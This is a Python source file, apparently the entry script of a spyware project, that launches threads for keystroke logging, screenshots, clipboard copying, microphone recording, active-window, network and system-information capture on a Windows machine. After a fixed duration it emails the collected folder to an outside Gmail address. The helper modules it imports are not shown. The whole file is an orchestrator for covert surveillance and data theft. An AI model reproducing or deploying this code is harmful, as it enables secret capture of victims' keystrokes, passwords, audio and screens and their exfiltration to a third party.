import time
import threading

from functions.basic_keylogger import start_listener, stop_logging
from functions.computer_information import computer_information
from functions.copy_clipboard import copy_clipboard
from functions.microphone import microphone
from functions.track_active_window import track_active_window
from functions.screenshot import screenshot
from functions.network_track import track_network
from functions.send_email_log  import send_folder

# Global variables
duration = 10  
screenshot_interval = 5  

def run_keylogger():
    start_listener()  

def take_screenshots():
    start_time = time.time()
    while time.time() - start_time < duration:
        screenshot()
        time.sleep(screenshot_interval) 

def track_windows():
    track_active_window(duration)  

def track_network_info():
    track_network(duration)  

def gather_computer_info():
    computer_information()  

def copy_clipboard_data():
    time.sleep(duration)  
    copy_clipboard()  

def start_microphone():
    microphone()  

def main():
    global stop_logging

    keylogger_thread = threading.Thread(target=run_keylogger)
    screenshot_thread = threading.Thread(target=take_screenshots)
    window_thread = threading.Thread(target=track_windows)
    network_thread = threading.Thread(target=track_network_info)
    computer_info_thread = threading.Thread(target=gather_computer_info)
    clipboard_thread = threading.Thread(target=copy_clipboard_data)
    microphone_thread = threading.Thread(target=start_microphone)

    keylogger_thread.start()
    screenshot_thread.start()
    window_thread.start()
    network_thread.start()
    computer_info_thread.start()
    clipboard_thread.start()
    microphone_thread.start()

    time.sleep(duration)

    stop_logging = True  

    keylogger_thread.join()
    screenshot_thread.join()
    window_thread.join()
    network_thread.join()
    computer_info_thread.join()
    clipboard_thread.join()
    microphone_thread.join()
    
    send_folder("C:/Users/PC-Service/OneDrive/Desktop/project/files/", 
                "gamingabdou467@gmail.com")
main()
#hello world how are you today wsup everyonne